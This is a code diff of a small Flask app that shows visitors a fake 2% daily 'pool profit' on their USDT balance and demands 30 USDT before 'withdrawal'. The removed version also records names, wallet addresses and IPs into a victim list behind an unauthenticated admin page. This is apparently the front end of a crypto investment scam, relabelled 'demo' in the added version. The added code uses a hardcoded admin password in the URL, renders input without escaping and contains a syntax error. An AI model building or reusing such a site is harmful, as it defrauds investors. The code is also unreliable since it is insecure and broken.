@@ -1,24 +1,25 @@
-from flask import Flask, request, redirect, url_for, render_template_string
+from flask import Flask, request
 import sqlite3
-from datetime import datetime, date
+from datetime import datetime
 
 app = Flask(__name__)
+DB = "data.db"
 
-DB = "database.db"
+ADMIN_PASSWORD = "admin123"
+DAILY_RATE = 0.02
+WITHDRAW_LIMIT = 30
 
-# ---------------- DATABASE ----------------
+
+# ---------- DATABASE ----------
 def init_db():
     conn = sqlite3.connect(DB)
     c = conn.cursor()
     c.execute("""
         CREATE TABLE IF NOT EXISTS users (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            name TEXT,
-            wallet TEXT UNIQUE,
+            wallet TEXT PRIMARY KEY,
             balance REAL,
-            profit REAL DEFAULT 0,
-            last_check TEXT,
-            ip TEXT
+            profit REAL,
+            last_date TEXT
         )
     """)
     conn.commit()
@@ -26,135 +27,119 @@ def init_db():
 
 init_db()
 
-# ---------------- HTML ----------------
-HTML = """
-<!DOCTYPE html>
-<html>
-<head>
-<title>Pool Profit Checker</title>
-<style>
-body {
-    background-image: url('/static/bg.png');
-    background-size: cover;
-    font-family: Arial;
-}
-.box {
-    background: rgba(0,0,0,0.7);
-    padding: 20px;
-    width: 350px;
-    margin: 100px auto;
-    color: white;
-    border-radius: 10px;
-}
-input, button {
-    width: 100%;
-    padding: 10px;
-    margin-top: 10px;
-}
-.error { color: red; }
-.success { color: lightgreen; }
-</style>
-</head>
-<body>
-<div class="box">
-<h2>Pool Profit Check</h2>
-<form method="POST">
-<input name="name" placeholder="Your Name" required>
-<input name="wallet" placeholder="ERC20 Wallet Address" required>
-<input name="balance" type="number" step="0.01" placeholder="USDT Balance" required>
-<button type="submit">Check Profit</button>
-</form>
 
-{% if msg %}
-<p class="{{ cls }}">{{ msg }}</p>
-{% endif %}
-</div>
-</body>
-</html>
-"""
-
-# ---------------- LOGIC ----------------
+# ---------- HOME ----------
 @app.route("/", methods=["GET", "POST"])
-def home():
+def index():
     msg = ""
-    cls = ""
+    profit = 0
 
     if request.method == "POST":
-        name = request.form["name"].strip()
-        wallet = request.form["wallet"].strip()
+        wallet = request.form["wallet"]
         balance = float(request.form["balance"])
-        ip = request.remote_addr
-        today = str(date.today())
-
-        if not wallet.startswith("0x") or len(wallet) != 42:
-            msg = "Invalid wallet address. Please provide a valid ERC20 address."
-            cls = "error"
-            return render_template_string(HTML, msg=msg, cls=cls)
-
-        if balance <= 0:
-            msg = "Wallet balance is 0. Please check your wallet address."
-            cls = "error"
-            return render_template_string(HTML, msg=msg, cls=cls)
+        today = datetime.now().strftime("%Y-%m-%d")
 
         conn = sqlite3.connect(DB)
         c = conn.cursor()
-        c.execute("SELECT profit, last_check FROM users WHERE wallet=?", (wallet,))
+        c.execute("SELECT profit, last_date FROM users WHERE wallet=?", (wallet,))
         row = c.fetchone()
 
-        daily_rate = 0.02  # 2%
-
         if row:
-            profit, last_check = row
-            if last_check != today:
-                profit += balance * daily_rate
-                c.execute("""
-                    UPDATE users
-                    SET profit=?, balance=?, last_check=?, ip=?
-                    WHERE wallet=?
-                """, (profit, balance, today, ip, wallet))
+            old_profit, last_date = row
+            if last_date != today:
+                new_profit = old_profit + (balance * DAILY_RATE)
+            else:
+                new_profit = old_profit
         else:
-            profit = balance * daily_rate
-            c.execute("""
-                INSERT INTO users (name, wallet, balance, profit, last_check, ip)
-                VALUES (?, ?, ?, ?, ?, ?)
-            """, (name, wallet, balance, profit, today, ip))
+            new_profit = balance * DAILY_RATE
+
+        c.execute("""
+            INSERT OR REPLACE INTO users
+            (wallet, balance, profit, last_date)
+            VALUES (?, ?, ?, ?)
+        """, (wallet, balance, new_profit, today))
 
         conn.commit()
         conn.close()
 
-        msg = f"Your total profit: {profit:.2f} USDT<br>"
-        if profit < 30:
-            msg += "⚠ Your wallet balance is low. You must reach 30 USDT profit to withdraw."
-            cls = "error"
+        profit = round(new_profit, 2)
+
+        if profit < WITHDRAW_LIMIT: 30
+            msg = f"⚠️ Your profit is {profit} USDT. You must reach {30} USDT to withdraw."
         else:
-            msg += "✅ You are eligible for withdrawal."
-            cls = "success"
+            msg = "✅ Withdrawal unlocked (demo only)."
 
-    return render_template_string(HTML, msg=msg, cls=cls)
+    return f"""
+    <html>
+    <head>
+        <title>Pooldata – Demo</title>
+        <style>
+            body {{ font-family: Arial; background:#f4f4f4; padding:40px; }}
+            .box {{ background:white; padding:20px; width:400px; margin:auto; }}
+            input, button {{ width:100%; padding:10px; margin:5px 0; }}
+            .note {{ color:red; font-size:14px; }}
+        </style>
+    </head>
+    <body>
 
-# ---------------- ADMIN PANEL ----------------
+    <div class="box">
+        <h2>Pooldata (Demo Simulation)</h2>
+
+        <p class="note">
+        ⚠️ Please don't share your personal information to anyone its can't be refundable.
+        </p>
+
+        <form method="POST">
+            <input name="wallet" placeholder="Wallet address" required>
+            <input name="balance" placeholder="USDT balance" required>
+            <button>Check Profit</button>
+        </form>
+
+        <h3>Profit: {profit} USDT</h3>
+        <p>{msg}</p>
+    </div>
+
+    </body>
+    </html>
+    """
+
+
+# ---------- ADMIN PANEL ----------
 @app.route("/admin")
 def admin():
+    if request.args.get("password") != ADMIN_PASSWORD:
+        return "Unauthorized"
+
     conn = sqlite3.connect(DB)
     c = conn.cursor()
-    c.execute("SELECT name, wallet, balance, profit, last_check, ip FROM users")
-    users = c.fetchall()
+    c.execute("SELECT * FROM users ORDER BY profit DESC")
+    rows = c.fetchall()
     conn.close()
 
-    return """
-    <h2>Admin Panel</h2>
-    <table border=1 cellpadding=5>
+    html = """
+    <h2>Admin Panel (Demo)</h2>
+    <table border=1 cellpadding=8>
     <tr>
-    <th>Name</th><th>Wallet</th><th>Balance</th>
-    <th>Profit</th><th>Last Check</th><th>IP</th>
+        <th>Wallet</th>
+        <th>Balance</th>
+        <th>Profit</th>
+        <th>Last Check</th>
     </tr>
-    """ + "".join(
-f"<tr><td>{u[0]}</td><td>{u[1]}</td><td>{u[2]}</td><td>{u[3]:.2f}</td><td>{u[4]}</td><td>{u[5]}</td></tr>"
-        for u in users
-    ) + "</table>"
+    """
 
-# ---------------- RUN ----------------
+    for r in rows:
+        html += f"""
+        <tr>
+            <td>{r[0]}</td>
+            <td>{r[1]}</td>
+            <td>{round(r[2],2)}</td>
+            <td>{r[3]}</td>
+        </tr>
+        """
+
+    html += "</table>"
+    return html
+
+
 if __name__ == "__main__":
     app.run(debug=True)
-
-
